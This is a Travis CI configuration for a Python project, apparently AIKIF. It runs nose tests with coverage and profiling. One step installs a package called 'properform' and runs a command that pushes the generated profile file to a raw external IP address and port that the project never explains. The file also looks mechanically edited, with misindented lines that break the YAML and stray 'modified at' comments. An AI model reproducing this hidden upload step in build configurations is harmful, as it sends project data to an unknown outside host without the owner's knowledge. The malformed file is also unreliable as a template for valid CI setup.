language: python
python:
  - "3.4"

before_install:
  - "export DISPLAY=:99.0"
  - "sh -e /etc/init.d/xvfb start"
  # add for profile
  - sudo add-apt-repository -y ppa:ubuntu-toolchain-r/test
  - sudo apt-get update -qq

# command to install dependencies, e.g. pip install -r requirements.txt --use-mirrors
install: 
  - pip install .
  - pip install coverage
  - pip install nose coverage
  - pip install coveralls
# add for profile
  - sudo apt-get install -qq g++-4.8
  - export CXX="g++-4.8"
  - pip install nose-cprof
  - pip install properform

# # command to run tests, e.g. python setup.py test
script:  
  - python setup.py nosetests --with-coverage --cover-package pypiview --with-cprofile --cprofile-stats-erase --cprofile-stats-file=profile_AIKIF_e658a18967_1
- python -m properform Push 47.88.50.110:15554 asdf_AIKIF_e658a18967_1 ./profile_AIKIF_e658a18967_1
  - coverage run --source=AIKIF setup.py test
  - nosetests --with-coverage
 
 after_success:  
  - coveralls
 #2017-08-14 01:53:17 modified at 0 #2017-08-14 01:53:21 modified at 1